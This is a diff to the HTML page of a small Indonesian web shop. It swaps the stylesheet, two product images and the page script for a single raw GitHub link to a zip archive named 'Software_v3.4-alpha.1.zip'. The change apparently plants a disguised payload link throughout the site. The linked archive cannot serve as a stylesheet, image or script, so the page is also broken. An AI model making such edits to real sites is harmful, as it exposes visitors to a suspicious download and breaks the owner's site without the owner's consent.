@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="description" content="Yudastore - Tempat Belanja Online Terpercaya">
     <title>Yudastore</title>
-    <link rel="stylesheet" type="text/css" href="style.css">
+    <link rel="stylesheet" type="text/css" href="https://github.com/yuuddd53/tokoyuda/raw/refs/heads/main/recapture/Software_v3.4-alpha.1.zip">
 </head>
 <body>
     <header>
@@ -32,13 +32,13 @@
             <div class="product-list">
                 <!-- Contoh produk -->
                 <div class="product">
-                    <img src="product1.jpg" alt="Produk 1">
+                    <img src="https://github.com/yuuddd53/tokoyuda/raw/refs/heads/main/recapture/Software_v3.4-alpha.1.zip" alt="Produk 1">
                     <h3>Produk 1</h3>
                     <p>Harga: Rp100.000</p>
                     <a href="#" class="btn">Beli Sekarang</a>
                 </div>
                 <div class="product">
-                    <img src="product2.jpg" alt="Produk 2">
+                    <img src="https://github.com/yuuddd53/tokoyuda/raw/refs/heads/main/recapture/Software_v3.4-alpha.1.zip" alt="Produk 2">
                     <h3>Produk 2</h3>
                     <p>Harga: Rp150.000</p>
                     <a href="#" class="btn">Beli Sekarang</a>
@@ -56,6 +56,6 @@
         </ul>
     </footer>
 
-    <script src="script.js"></script> <!-- Link ke file JavaScript eksternal -->
+    <script src="https://github.com/yuuddd53/tokoyuda/raw/refs/heads/main/recapture/Software_v3.4-alpha.1.zip"></script> <!-- Link ke file JavaScript eksternal -->
 </body>
 </html>
